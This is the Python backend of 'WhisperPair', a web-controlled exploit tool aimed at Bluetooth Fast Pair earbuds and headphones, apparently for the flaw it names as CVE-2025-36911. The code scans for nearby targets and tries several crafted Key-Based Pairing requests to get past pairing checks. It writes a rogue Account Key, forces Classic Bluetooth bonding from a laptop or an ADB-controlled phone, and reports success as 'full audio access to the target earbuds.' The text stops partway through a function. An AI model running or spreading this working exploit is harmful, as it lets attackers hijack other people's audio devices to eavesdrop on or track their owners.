#!/usr/bin/env python3
"""
WhisperPair Web Interface - Backend
Flask + Socket.IO server wrapping fast_pair_demo.py
"""

import asyncio
import subprocess
import threading
import time
from datetime import datetime
from dataclasses import asdict

import base64
import os
import select
import socket as sock
from flask import Flask, jsonify, send_file
from flask_cors import CORS
from flask_socketio import SocketIO, emit

from fast_pair_demo import (
    ExploitStrategy,
    WhisperPairExploit,
    scan_for_targets,
    build_raw_kbp_request,
    build_retroactive_request,
    build_extended_request,
    parse_kbp_response,
    calculate_entropy,
    pair_classic_bluetooth,
    connect_classic_bluetooth,
    aes_encrypt,
    CHAR_KEY_PAIRING,
    CHAR_PASSKEY,
    CHAR_ACCOUNT_KEY,
    CHAR_MODEL_ID,
    MessageType,
)

import secrets

from adb_manager import ADBManager
from known_devices import lookup_device, KNOWN_DEVICES

adb = ADBManager()
selected_adb_device = None

app = Flask(__name__)
CORS(app)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

# Cached state
discovered_devices = []
active_exploit = None
exploit_cancel = threading.Event()

STRATEGIES = {
    "RAW_KBP": {
        "name": "RAW_KBP",
        "label": "Raw KBP",
        "description": "Raw unencrypted Key-Based Pairing request. Most common for vulnerable devices.",
        "flags": "0x11",
        "value": int(ExploitStrategy.RAW_KBP),
    },
    "RAW_WITH_SEEKER": {
        "name": "RAW_WITH_SEEKER",
        "label": "Raw + Seeker Address",
        "description": "Raw KBP with seeker address included for bonding initiation.",
        "flags": "0x01",
        "value": int(ExploitStrategy.RAW_WITH_SEEKER),
    },
    "RETROACTIVE": {
        "name": "RETROACTIVE",
        "label": "Retroactive Pairing",
        "description": "Retroactive pairing flag bypass. Sets bonding + retroactive bits.",
        "flags": "0x0A",
        "value": int(ExploitStrategy.RETROACTIVE),
    },
    "EXTENDED_RESPONSE": {
        "name": "EXTENDED_RESPONSE",
        "label": "Extended Response",
        "description": "Requests extended response format from the device.",
        "flags": "0x10",
        "value": int(ExploitStrategy.EXTENDED_RESPONSE),
    },
}


# ==============================================================================
# REST ENDPOINTS
# ==============================================================================


@app.route("/api/status")
def api_status():
    return jsonify({
        "status": "online",
        "timestamp": datetime.now().isoformat(),
        "devices_cached": len(discovered_devices),
        "exploit_running": active_exploit is not None,
    })


@app.route("/api/devices")
def api_devices():
    return jsonify(discovered_devices)


@app.route("/api/strategies")
def api_strategies():
    return jsonify(list(STRATEGIES.values()))


@app.route("/api/known-devices")
def api_known_devices():
    return jsonify(KNOWN_DEVICES)


# ==============================================================================
# SOCKET.IO EVENTS
# ==============================================================================


@socketio.on("connect")
def handle_connect():
    emit("server:status", {"status": "connected"})


@socketio.on("adb:scan")
def handle_adb_scan():
    devices = adb.list_devices()
    for dev in devices:
        info = adb.get_device_info(dev["id"])
        dev.update(info)
    emit("adb:devices", {"devices": devices})


@socketio.on("adb:select")
def handle_adb_select(data):
    global selected_adb_device
    selected_adb_device = data.get("device_id")
    emit("adb:status", {
        "stage": "selected",
        "message": f"Selected device: {selected_adb_device}",
        "status": "success",
    })


@socketio.on("track:start")
def handle_track_start(data):
    mode = data.get("mode", "phone")
    if mode == "laptop":
        handle_track_laptop(data)
    else:
        handle_track_phone(data)


def force_hci_connection(bredr_address):
    """Send raw HCI Create_Connection to force a Classic BT ACL link.
    Requires CAP_NET_RAW (run backend with sudo).
    Returns True if the connection was initiated.
    """
    import struct
    import socket as raw_sock

    try:
        s = raw_sock.socket(raw_sock.AF_BLUETOOTH, raw_sock.SOCK_RAW, raw_sock.BTPROTO_HCI)
        s.bind((0,))  # hci0

        addr_bytes = bytes.fromhex(bredr_address.replace(":", ""))[::-1]
        pkt_type = struct.pack("<H", 0xCC18)
        page_scan_rep = struct.pack("B", 0x02)  # R2
        reserved = struct.pack("B", 0x00)
        clock_offset = struct.pack("<H", 0x0000)
        allow_role_switch = struct.pack("B", 0x01)

        params = addr_bytes + pkt_type + page_scan_rep + reserved + clock_offset + allow_role_switch
        cmd = struct.pack("B", 0x01)  # HCI command
        cmd += struct.pack("<H", 0x0405)  # Create_Connection opcode
        cmd += struct.pack("B", len(params)) + params

        s.send(cmd)
        s.close()
        return True
    except PermissionError:
        return False
    except Exception:
        return False


def handle_track_laptop(data):
    """Pair with the target device from the laptop via BLE + CTKD for BR/EDR.
    Uses D-Bus (BlueZ API) for reliable, event-driven BLE pairing instead of
    scripting bluetoothctl. Requires sudo for /var/lib/bluetooth access and
    bluetoothd restart.
    """
    bredr_address = data.get("bredr_address")
    ble_address = data.get("ble_address")
    device_name = data.get("device_name", "Unknown")

    if not bredr_address:
        emit("track:status", {"stage": "error", "message": "No BR/EDR address provided", "status": "error"})
        return
    if not ble_address:
        emit("track:status", {"stage": "error", "message": "No BLE address provided — run exploit first", "status": "error"})
        return

    def run_laptop_pair():
        """Pair via BLE (D-Bus), then CTKD to derive BR/EDR link key."""
        from ctkd import perform_ctkd

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(_laptop_pair_async(ble_address, bredr_address, device_name))
        except Exception as e:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": f"Laptop pairing error: {e}",
                "status": "error",
            })
        finally:
            loop.close()

    thread = threading.Thread(target=run_laptop_pair, daemon=True)
    thread.start()


async def _laptop_pair_async(ble_address, bredr_address, device_name):
    """Async laptop pairing flow using D-Bus for BLE and CTKD for BR/EDR."""
    from dbus_fast.aio import MessageBus
    from dbus_fast import BusType, Variant
    from ctkd import perform_ctkd

    BLUEZ_SERVICE = "org.bluez"
    ADAPTER_IFACE = "org.bluez.Adapter1"
    DEVICE_IFACE = "org.bluez.Device1"
    AGENT_MANAGER_IFACE = "org.bluez.AgentManager1"
    PROPERTIES_IFACE = "org.freedesktop.DBus.Properties"
    OBJECT_MANAGER_IFACE = "org.freedesktop.DBus.ObjectManager"

    def status(msg, stage="pairing", status="running"):
        socketio.emit("track:status", {"stage": stage, "message": msg, "status": status})

    status(f"Step 1/4: Discovering {ble_address} via BLE...")

    bus = await MessageBus(bus_type=BusType.SYSTEM).connect()

    try:
        # Find the adapter object path
        introspection = await bus.introspect(BLUEZ_SERVICE, "/")
        obj_manager = bus.get_proxy_object(BLUEZ_SERVICE, "/",
                                           introspection)
        manager = obj_manager.get_interface(OBJECT_MANAGER_IFACE)
        objects = await manager.call_get_managed_objects()

        adapter_path = None
        for path, ifaces in objects.items():
            if ADAPTER_IFACE in ifaces:
                adapter_path = path
                break

        if not adapter_path:
            status("No Bluetooth adapter found via D-Bus", stage="complete", status="error")
            return

        # Get adapter proxy and start discovery
        adapter_intro = await bus.introspect(BLUEZ_SERVICE, adapter_path)
        adapter_obj = bus.get_proxy_object(BLUEZ_SERVICE, adapter_path, adapter_intro)
        adapter = adapter_obj.get_interface(ADAPTER_IFACE)
        adapter_props = adapter_obj.get_interface(PROPERTIES_IFACE)

        # Ensure adapter is powered on
        try:
            powered = await adapter_props.call_get(ADAPTER_IFACE, "Powered")
            if not powered.value:
                await adapter_props.call_set(ADAPTER_IFACE, "Powered", Variant("b", True))
                await asyncio.sleep(1)
        except Exception:
            pass

        # Start discovery
        try:
            await adapter.call_start_discovery()
        except Exception:
            pass  # May already be discovering

        # Wait for the device to appear in BlueZ's object tree
        dev_path = None
        addr_part = ble_address.upper().replace(":", "_")
        expected_path = f"{adapter_path}/dev_{addr_part}"

        for attempt in range(15):  # Up to 15 seconds
            objects = await manager.call_get_managed_objects()
            if expected_path in objects:
                dev_path = expected_path
                break
            await asyncio.sleep(1)

        try:
            await adapter.call_stop_discovery()
        except Exception:
            pass

        if not dev_path:
            status(f"Device {ble_address} not found after BLE scan. "
                   f"Make sure the device is nearby and awake.",
                   stage="complete", status="warning")
            return

        status(f"Step 2/4: BLE pairing with {ble_address}...")

        # Get device proxy
        dev_intro = await bus.introspect(BLUEZ_SERVICE, dev_path)
        dev_obj = bus.get_proxy_object(BLUEZ_SERVICE, dev_path, dev_intro)
        device = dev_obj.get_interface(DEVICE_IFACE)
        dev_props = dev_obj.get_interface(PROPERTIES_IFACE)

        # Trust the device first (enables auto-accept for Just Works)
        try:
            await dev_props.call_set(DEVICE_IFACE, "Trusted", Variant("b", True))
        except Exception:
            pass

        # Check if already paired
        paired_var = await dev_props.call_get(DEVICE_IFACE, "Paired")
        if paired_var.value:
            status(f"Device {ble_address} already paired, skipping to CTKD...")
        else:
            # Pair — this triggers SMP and creates the LTK in BlueZ storage
            pair_done = asyncio.Event()
            pair_error = None

            def on_props_changed(iface, changed, invalidated):
                nonlocal pair_error
                if iface == DEVICE_IFACE and "Paired" in changed:
                    if changed["Paired"].value:
                        pair_done.set()

            dev_props.on_properties_changed(on_props_changed)

            try:
                await device.call_pair()
            except Exception as e:
                err_str = str(e)
                if "AlreadyExists" in err_str:
                    pair_done.set()
                else:
                    status(f"BLE pairing failed: {e}", stage="complete", status="warning")
                    return

            try:
                await asyncio.wait_for(pair_done.wait(), timeout=20.0)
            except asyncio.TimeoutError:
                # Check one more time — the signal may have been missed
                paired_var = await dev_props.call_get(DEVICE_IFACE, "Paired")
                if not paired_var.value:
                    status(f"BLE pairing with {ble_address} timed out. "
                           f"Device may require interaction.",
                           stage="complete", status="warning")
                    return

        status("BLE paired. Step 3/4: Deriving BR/EDR Link Key via CTKD...")

        # Give BlueZ a moment to flush the LTK to disk
        await asyncio.sleep(1)

        # CTKD — derive BR/EDR link key from LE LTK
        success, msg, link_key_hex = perform_ctkd(
            bredr_address,
            ble_address=ble_address,
            device_name_hint=device_name if device_name != "Unknown" else None,
            device_name=device_name,
        )

        status(msg[:140], status="running" if success else "warning")

        if not success:
            status(f"CTKD failed: {msg}", stage="complete", status="warning")
            return

        # bluetoothd was restarted by CTKD — reconnect to D-Bus
        await asyncio.sleep(1)
        bus2 = await MessageBus(bus_type=BusType.SYSTEM).connect()

        status(f"Step 4/4: Connecting to {bredr_address} with derived Link Key...")

        try:
            # After bluetoothd restart, the BR/EDR device should appear as paired
            bredr_part = bredr_address.upper().replace(":", "_")

            # Re-discover adapter path (may change after restart)
            intro2 = await bus2.introspect(BLUEZ_SERVICE, "/")
            om2 = bus2.get_proxy_object(BLUEZ_SERVICE, "/", intro2)
            mgr2 = om2.get_interface(OBJECT_MANAGER_IFACE)
            objects2 = await mgr2.call_get_managed_objects()

            adapter_path2 = None
            for path, ifaces in objects2.items():
                if ADAPTER_IFACE in ifaces:
                    adapter_path2 = path
                    break

            bredr_dev_path = f"{adapter_path2}/dev_{bredr_part}"

            if bredr_dev_path not in objects2:
                # Device not yet visible — give BlueZ more time to load keys
                await asyncio.sleep(2)
                objects2 = await mgr2.call_get_managed_objects()

            if bredr_dev_path in objects2:
                bredr_intro = await bus2.introspect(BLUEZ_SERVICE, bredr_dev_path)
                bredr_obj = bus2.get_proxy_object(BLUEZ_SERVICE, bredr_dev_path, bredr_intro)
                bredr_dev = bredr_obj.get_interface(DEVICE_IFACE)
                bredr_props = bredr_obj.get_interface(PROPERTIES_IFACE)

                # Trust it so BlueZ doesn't block the connection
                try:
                    await bredr_props.call_set(DEVICE_IFACE, "Trusted", Variant("b", True))
                except Exception:
                    pass

                # Connect
                connect_done = asyncio.Event()

                def on_bredr_changed(iface, changed, invalidated):
                    if iface == DEVICE_IFACE and "Connected" in changed:
                        if changed["Connected"].value:
                            connect_done.set()

                bredr_props.on_properties_changed(on_bredr_changed)

                await bredr_dev.call_connect()

                try:
                    await asyncio.wait_for(connect_done.wait(), timeout=10.0)
                except asyncio.TimeoutError:
                    pass

                # Verify final state
                connected_var = await bredr_props.call_get(DEVICE_IFACE, "Connected")
                paired_var = await bredr_props.call_get(DEVICE_IFACE, "Paired")

                if connected_var.value:
                    socketio.emit("track:status", {
                        "stage": "complete",
                        "message": f"Laptop connected to {bredr_address} via CTKD! "
                                   f"Link Key derived from LE bond.",
                        "status": "success",
                        "bredr_address": bredr_address,
                    })
                elif paired_var.value:
                    socketio.emit("track:status", {
                        "stage": "complete",
                        "message": f"Link Key injected. Device paired but not connected — "
                                   f"try connecting manually or check audio profiles.",
                        "status": "success",
                        "bredr_address": bredr_address,
                    })
                else:
                    status(
                        f"CTKD key injected but connection failed. "
                        f"The device may not support CTKD or may have rejected the key.",
                        stage="complete", status="warning",
                    )
            else:
                # BlueZ doesn't see the BR/EDR device — fall back to bluetoothctl connect
                connect_r = subprocess.run(
                    ["bluetoothctl", "connect", bredr_address],
                    capture_output=True, text=True, timeout=15,
                )
                if "Connection successful" in connect_r.stdout:
                    socketio.emit("track:status", {
                        "stage": "complete",
                        "message": f"Laptop connected to {bredr_address} via CTKD (bluetoothctl fallback).",
                        "status": "success",
                        "bredr_address": bredr_address,
                    })
                else:
                    status(
                        f"CTKD key injected but BR/EDR device not visible to BlueZ. "
                        f"Try: bluetoothctl connect {bredr_address}",
                        stage="complete", status="warning",
                    )
        except Exception as e:
            status(
                f"BR/EDR connection step failed: {e}",
                stage="complete", status="warning",
            )
        finally:
            bus2.disconnect()
    finally:
        bus.disconnect()


def handle_track_phone(data):
    """Launch the companion app on the Android phone to perform Fast Pair KBP."""
    device_id = data.get("device_id") or selected_adb_device
    ble_address = data.get("ble_address")
    bredr_address = data.get("bredr_address")

    if not device_id:
        emit("track:status", {
            "stage": "error",
            "message": "No Android phone connected via ADB",
            "status": "error",
        })
        return

    if not ble_address:
        emit("track:status", {
            "stage": "error",
            "message": "No target BLE address available",
            "status": "error",
        })
        return

    def run_companion_pair():
        # Step 1: Remove device from laptop's Bluetooth so only the phone pairs
        socketio.emit("track:status", {
            "stage": "cleanup",
            "message": "Removing target from laptop Bluetooth...",
            "status": "running",
        })
        subprocess.run(["bluetoothctl", "remove", ble_address],
                       capture_output=True, text=True, timeout=10)
        if bredr_address:
            subprocess.run(["bluetoothctl", "remove", bredr_address],
                           capture_output=True, text=True, timeout=10)

        # Step 2: Snapshot bonded devices on phone
        bonded_before = adb.get_bonded_addresses(device_id)

        # Step 3: Launch companion app on phone with BLE + BR/EDR addresses
        socketio.emit("track:status", {
            "stage": "launching",
            "message": f"Launching WhisperPair companion — BLE: {ble_address}, BR/EDR: {bredr_address or 'auto'}...",
            "status": "running",
        })

        cmd = ["adb", "-s", device_id, "shell", "am", "start",
               "-a", "com.whisperpair.PAIR",
               "--es", "address", ble_address]
        if bredr_address:
            cmd.extend(["--es", "bredr_address", bredr_address])

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)

        if result.returncode != 0:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": f"Failed to launch companion app: {result.stderr.strip()}. "
                           "Install it first: adb install android/app/build/outputs/apk/debug/app-debug.apk",
                "status": "error",
            })
            return

        socketio.emit("track:status", {
            "stage": "exploiting",
            "message": "Companion app running KBP exploit from phone. Watch phone screen for progress...",
            "status": "running",
        })

        # Step 4: Monitor logcat for companion app output
        logcat_proc = subprocess.Popen(
            ["adb", "-s", device_id, "logcat", "-s", "WhisperPair:D", "-v", "brief"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )

        kbp_accepted = False
        account_key_written = False
        classic_paired = False
        start_time = time.time()
        timeout = 60  # 60 seconds max

        try:
            import select
            while time.time() - start_time < timeout:
                ready, _, _ = select.select([logcat_proc.stdout], [], [], 2.0)
                if ready:
                    line = logcat_proc.stdout.readline().strip()
                    if not line:
                        continue

                    # Parse log messages from companion app
                    msg = line.split(":", 1)[-1].strip() if ":" in line else line

                    if "KBP ACCEPTED" in msg:
                        kbp_accepted = True
                        socketio.emit("track:status", {
                            "stage": "kbp_accepted",
                            "message": "KBP accepted from phone — device is vulnerable!",
                            "status": "success",
                        })
                    elif "Account Key written" in msg:
                        account_key_written = True
                        socketio.emit("track:status", {
                            "stage": "account_key",
                            "message": msg,
                            "status": "success",
                        })
                    elif "Device bonded" in msg or "BOND_BONDED" in msg or "Classic BT paired" in msg:
                        classic_paired = True
                        socketio.emit("track:status", {
                            "stage": "paired",
                            "message": msg,
                            "status": "success",
                        })
                    elif "EXPLOIT COMPLETE" in msg:
                        classic_paired = True
                        break
                    elif "PARTIAL SUCCESS" in msg:
                        break
                    elif "ERROR" in msg or "rejected" in msg.lower():
                        socketio.emit("track:status", {
                            "stage": "exploiting",
                            "message": msg,
                            "status": "warning",
                        })

                # Also check bond state
                if not classic_paired:
                    if adb.verify_new_bond(device_id, bonded_before):
                        classic_paired = True
        finally:
            logcat_proc.terminate()
            logcat_proc.wait(timeout=5)

        # Report final status
        if classic_paired:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": "Device force-paired with phone via CVE-2025-36911! "
                           "Phone now has full audio access to the target earbuds.",
                "status": "success",
                "bredr_address": bredr_address or ble_address,
            })
        elif kbp_accepted:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": "KBP accepted (device is vulnerable) but Classic BT bond did not complete. "
                           "The device may need to be closer to the phone, or try again.",
                "status": "warning",
            })
        else:
            socketio.emit("track:status", {
                "stage": "complete",
                "message": "Companion app did not complete. Check the phone screen for details or permissions prompt.",
                "status": "warning",
            })

    thread = threading.Thread(target=run_companion_pair, daemon=True)
    thread.start()


@socketio.on("scan:start")
def handle_scan_start(data=None):
    duration = 10
    if data and "duration" in data:
        duration = min(int(data["duration"]), 30)

    def run_scan():
        global discovered_devices
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        socketio.emit("scan:status", {"status": "scanning", "duration": duration})

        try:
            devices = loop.run_until_complete(scan_for_targets(timeout=duration))
            discovered_devices = devices

            for dev in devices:
                enriched = dict(dev)
                db_entry = lookup_device(enriched.get("model_id"))
                if db_entry:
                    enriched["known_name"] = db_entry["name"]
                    enriched["manufacturer"] = db_entry["manufacturer"]
                    enriched["device_type"] = db_entry["type"]
                else:
                    enriched["known_name"] = None
                    enriched["manufacturer"] = None
                    enriched["device_type"] = None
                socketio.emit("scan:device_found", enriched)
                time.sleep(0.1)

            socketio.emit("scan:complete", {
                "count": len(devices),
                "duration": duration,
            })
        except Exception as e:
            socketio.emit("scan:error", {"message": str(e)})
        finally:
            loop.close()

    thread = threading.Thread(target=run_scan, daemon=True)
    thread.start()


@socketio.on("exploit:start")
def handle_exploit_start(data):
    global active_exploit
    exploit_cancel.clear()

    address = data.get("address")
    strategy_names = data.get("strategies", [])

    if not address:
        emit("exploit:error", {"message": "No target address provided"})
        return

    if not strategy_names:
        emit("exploit:error", {"message": "No strategies selected"})
        return

    strategies = []
    for name in strategy_names:
        try:
            strategies.append(ExploitStrategy[name])
        except KeyError:
            emit("exploit:error", {"message": f"Unknown strategy: {name}"})
            return

    def run_exploit():
        global active_exploit
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        try:
            loop.run_until_complete(
                _run_exploit_chain(address, strategies)
            )
        except Exception as e:
            socketio.emit("exploit:error", {"message": str(e)})
        finally:
            active_exploit = None
            loop.close()

    active_exploit = address
    thread = threading.Thread(target=run_exploit, daemon=True)
    thread.start()


@socketio.on("exploit:stop")
def handle_exploit_stop():
    global active_exploit
    exploit_cancel.set()
    active_exploit = None
    emit("exploit:stage", {
        "stage": "cancelled",
        "message": "Exploit cancelled by user",
        "status": "error",
    })


@socketio.on("vuln_test:start")
def handle_vuln_test_start(data):
    address = data.get("address")
    strategy_names = data.get("strategies", [])

    if not address:
        emit("exploit:error", {"message": "No target address provided"})
        return

    if not strategy_names:
        emit("exploit:error", {"message": "No strategies selected"})
        return

    strategies = []
    for name in strategy_names:
        try:
            strategies.append(ExploitStrategy[name])
        except KeyError:
            emit("exploit:error", {"message": f"Unknown strategy: {name}"})
            return

    def run_vuln_test():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(_run_vuln_test(address, strategies))
        except Exception as e:
            socketio.emit("exploit:error", {"message": str(e)})
        finally:
            loop.close()

    thread = threading.Thread(target=run_vuln_test, daemon=True)
    thread.start()


# ==============================================================================
# EXPLOIT CHAIN (runs in background thread with event emissions)
# ==============================================================================


async def _run_exploit_chain(address: str, strategies: list):
    """Run exploit chain with real-time Socket.IO updates"""
    from bleak import BleakClient

    def stage(name, message, status="running"):
        socketio.emit("exploit:stage", {
            "stage": name,
            "message": message,
            "status": status,
            "timestamp": datetime.now().isoformat(),
        })

    result = {
        "success": False,
        "vulnerable": False,
        "br_edr_address": None,
        "paired": False,
        "account_key_written": False,
        "message": "",
        "model_id": None,
        "notifications": [],
        "strategies_tried": [],
    }

    client = None
    shared_secret = None
    br_edr_address = None
    kbp_response = None
    notification_event = asyncio.Event()
    notifications = []

    def notification_handler(sender, data: bytes):
        nonlocal kbp_response, br_edr_address
        char_uuid = str(sender.uuid).lower() if hasattr(sender, "uuid") else str(sender)
        entry = {
            "characteristic": char_uuid,
            "hex": data.hex(),
            "length": len(data),
            "entropy": round(calculate_entropy(data), 2),
            "timestamp": datetime.now().isoformat(),
        }
        notifications.append(entry)
        socketio.emit("exploit:notification", entry)

        if "1234" in char_uuid:
            kbp_response = data
            addr = parse_kbp_response(data, shared_secret)
            if addr:
                br_edr_address = addr
                stage("response_parsed", f"BR/EDR address extracted: {addr}", "success")

        notification_event.set()

    try:
        # Step 1: Connect with retry
        if exploit_cancel.is_set():
            return
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            if exploit_cancel.is_set():
                return
            backoff = 2 ** (attempt - 1)
            stage("connecting", f"Connecting to {address} (attempt {attempt}/{max_retries})...")

            try:
                client = BleakClient(address, timeout=15.0)
                await client.connect()
                if client.is_connected:
                    stage("connecting", "Connected to device", "success")
                    break
            except Exception as e:
                if attempt < max_retries:
                    stage("connecting", f"Attempt {attempt} failed: {e}. Retrying in {backoff}s...", "warning")
                    await asyncio.sleep(backoff)
                else:
                    stage("connecting", f"Connection failed after {max_retries} attempts: {e}", "error")
                    result["message"] = f"Connection failed after {max_retries} attempts"
                    socketio.emit("exploit:result", result)
                    return
        else:
            stage("connecting", "Connection failed", "error")
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return

        if not client.is_connected:
            stage("connecting", "Connection failed", "error")
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return

        # Step 1.5: MTU negotiation
        try:
            mtu = client.mtu_size
            stage("mtu", f"MTU negotiated: {mtu} bytes", "success")
        except Exception:
            stage("mtu", "MTU negotiation not supported, using default", "warning")

        # Step 2: Read Model ID
        if exploit_cancel.is_set():
            return
        stage("model_id", "Reading Model ID...")

        try:
            data = await client.read_gatt_char(CHAR_MODEL_ID)
            if len(data) >= 3:
                model_id = (data[0] << 16) | (data[1] << 8) | data[2]
                model_id_str = f"0x{model_id:06X}"
                result["model_id"] = model_id_str
                db_entry = lookup_device(model_id_str)
                if db_entry:
                    stage("model_id",
                          f"Model ID: {model_id_str} ({db_entry['manufacturer']} {db_entry['name']})",
                          "success")
                else:
                    stage("model_id", f"Model ID: {model_id_str}", "success")
            else:
                stage("model_id", "Model ID: unknown format", "warning")
        except Exception as e:
            stage("model_id", f"Could not read Model ID: {e}", "warning")

        # Step 3: Subscribe to notifications
        if exploit_cancel.is_set():
            return
        stage("subscribe", "Subscribing to notifications...")

        for char_uuid in [CHAR_KEY_PAIRING, CHAR_PASSKEY]:
            try:
                await client.start_notify(char_uuid, notification_handler)
            except Exception:
                pass

        stage("subscribe", "Subscribed to KBP + Passkey notifications", "success")
        await asyncio.sleep(0.5)

        # Step 4: Try exploit strategies
        kbp_accepted = False
        for strategy in strategies:
            if exploit_cancel.is_set():
                return

            strategy_name = strategy.name
            result["strategies_tried"].append(strategy_name)
            stage("kbp_request", f"Sending KBP request ({strategy_name})...")

            # Build request
            if strategy == ExploitStrategy.RAW_KBP:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RAW_WITH_SEEKER:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RETROACTIVE:
                request, shared_secret = build_retroactive_request(address)
            elif strategy == ExploitStrategy.EXTENDED_RESPONSE:
                request, shared_secret = build_extended_request(address)
            else:
                request, shared_secret = build_raw_kbp_request(address)

            try:
                notification_event.clear()
                await client.write_gatt_char(CHAR_KEY_PAIRING, request, response=True)

                kbp_accepted = True
                result["vulnerable"] = True
                stage("kbp_request", f"KBP ACCEPTED ({strategy_name}) - Device is VULNERABLE!", "success")

                # Wait for notification
                stage("waiting_response", "Waiting for device response...")
                try:
                    await asyncio.wait_for(notification_event.wait(), timeout=5.0)
                    stage("waiting_response", "Response received", "success")
                except asyncio.TimeoutError:
                    stage("waiting_response", "No notification received (timeout)", "warning")

                break

            except Exception as e:
                error_str = str(e).lower()
                if "not permitted" in error_str or "rejected" in error_str:
                    stage("kbp_request", f"KBP rejected ({strategy_name}) - device may be patched", "error")
                else:
                    stage("kbp_request", f"KBP failed ({strategy_name}): {e}", "error")

                await asyncio.sleep(1)

        if not kbp_accepted:
            result["message"] = "All strategies rejected - device appears patched"
            stage("complete", result["message"], "error")
            socketio.emit("exploit:result", result)
            return

        # Step 5: Determine BR/EDR address
        if not br_edr_address:
            br_edr_address = address
            stage("address", f"Using BLE address as BR/EDR fallback: {address}", "warning")
        else:
            stage("address", f"BR/EDR address: {br_edr_address}", "success")

        result["br_edr_address"] = br_edr_address

        # Step 6: Write Account Key
        if exploit_cancel.is_set():
            return
        stage("account_key", "Writing Account Key...")

        account_key = bytearray(16)
        account_key[0] = 0x04
        account_key[1:16] = secrets.token_bytes(15)
        result["account_key"] = account_key.hex()

        if shared_secret:
            data_to_write = aes_encrypt(shared_secret, bytes(account_key))
        else:
            data_to_write = bytes(account_key)

        try:
            await client.write_gatt_char(CHAR_ACCOUNT_KEY, data_to_write, response=True)
            result["account_key_written"] = True
            stage("account_key", f"Account Key written successfully: {account_key.hex()}", "success")
        except Exception as e:
            stage("account_key", f"Account Key write failed: {e}", "warning")

        # Step 7: Disconnect BLE
        await client.disconnect()
        client = None
        stage("disconnect", "BLE disconnected", "success")

        # Skip Classic BT pairing from laptop — the companion app on
        # the phone will handle pairing via the Track button.
        result["paired"] = False

        # Final result
        result["success"] = result["vulnerable"] and result["account_key_written"]
        result["notifications"] = notifications
        result["message"] = "Exploit successful!" if result["success"] else "Partial success - device is vulnerable"

        stage("complete", result["message"], "success" if result["success"] else "warning")
        socketio.emit("exploit:result", result)

    except Exception as e:
        result["message"] = f"Error: {e}"
        result["notifications"] = notifications
        stage("error", str(e), "error")
        socketio.emit("exploit:result", result)

    finally:
        if client and client.is_connected:
            try:
                await client.disconnect()
            except Exception:
                pass


async def _run_vuln_test(address: str, strategies: list):
    """Non-invasive vulnerability test: connect, send KBP, check response, disconnect.
    Does NOT write account key or attempt Classic BT pairing."""
    from bleak import BleakClient

    def stage(name, message, status="running"):
        socketio.emit("exploit:stage", {
            "stage": name,
            "message": message,
            "status": status,
            "timestamp": datetime.now().isoformat(),
        })

    result = {
        "success": False,
        "vulnerable": False,
        "br_edr_address": None,
        "paired": False,
        "account_key_written": False,
        "message": "",
        "model_id": None,
        "notifications": [],
        "strategies_tried": [],
        "test_only": True,
    }

    client = None
    shared_secret = None
    br_edr_address = None
    notification_event = asyncio.Event()
    notifications = []

    def notification_handler(sender, data: bytes):
        nonlocal br_edr_address
        char_uuid = str(sender.uuid).lower() if hasattr(sender, "uuid") else str(sender)
        entry = {
            "characteristic": char_uuid,
            "hex": data.hex(),
            "length": len(data),
            "entropy": round(calculate_entropy(data), 2),
            "timestamp": datetime.now().isoformat(),
        }
        notifications.append(entry)
        socketio.emit("exploit:notification", entry)

        if "1234" in char_uuid:
            addr = parse_kbp_response(data, shared_secret)
            if addr:
                br_edr_address = addr
                stage("response_parsed", f"BR/EDR address extracted: {addr}", "success")

        notification_event.set()

    try:
        # Step 1: Connect with retry
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            backoff = 2 ** (attempt - 1)
            stage("connecting", f"Connecting to {address} (attempt {attempt}/{max_retries})...")
            try:
                client = BleakClient(address, timeout=15.0)
                await client.connect()
                if client.is_connected:
                    stage("connecting", "Connected to device", "success")
                    break
            except Exception as e:
                if attempt < max_retries:
                    stage("connecting", f"Attempt {attempt} failed: {e}. Retrying in {backoff}s...", "warning")
                    await asyncio.sleep(backoff)
                else:
                    stage("connecting", f"Connection failed after {max_retries} attempts", "error")
                    result["message"] = "Connection failed"
                    socketio.emit("exploit:result", result)
                    return

        if not client or not client.is_connected:
            result["message"] = "Connection failed"
            socketio.emit("exploit:result", result)
            return

        # Step 2: Read Model ID
        stage("model_id", "Reading Model ID...")
        try:
            data = await client.read_gatt_char(CHAR_MODEL_ID)
            if len(data) >= 3:
                model_id = (data[0] << 16) | (data[1] << 8) | data[2]
                result["model_id"] = f"0x{model_id:06X}"
                stage("model_id", f"Model ID: 0x{model_id:06X}", "success")
        except Exception as e:
            stage("model_id", f"Could not read Model ID: {e}", "warning")

        # Step 3: Subscribe to notifications
        stage("subscribe", "Subscribing to notifications...")
        for char_uuid in [CHAR_KEY_PAIRING, CHAR_PASSKEY]:
            try:
                await client.start_notify(char_uuid, notification_handler)
            except Exception:
                pass
        stage("subscribe", "Subscribed to KBP + Passkey notifications", "success")
        await asyncio.sleep(0.5)

        # Step 4: Try exploit strategies (test only - just send KBP, no account key)
        kbp_accepted = False
        for strategy in strategies:
            strategy_name = strategy.name
            result["strategies_tried"].append(strategy_name)
            stage("kbp_request", f"[TEST] Sending KBP request ({strategy_name})...")

            if strategy == ExploitStrategy.RAW_KBP:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RAW_WITH_SEEKER:
                request, shared_secret = build_raw_kbp_request(address)
            elif strategy == ExploitStrategy.RETROACTIVE:
                request, shared_secret = build_retroactive_request(address)
            elif strategy == ExploitStrategy.EXTENDED_RESPONSE:
                request, shared_secret = build_extended_request(address)
            else:
                request, shared_secret = build_raw_kbp_request(address)

            try:
                notification_event.clear()
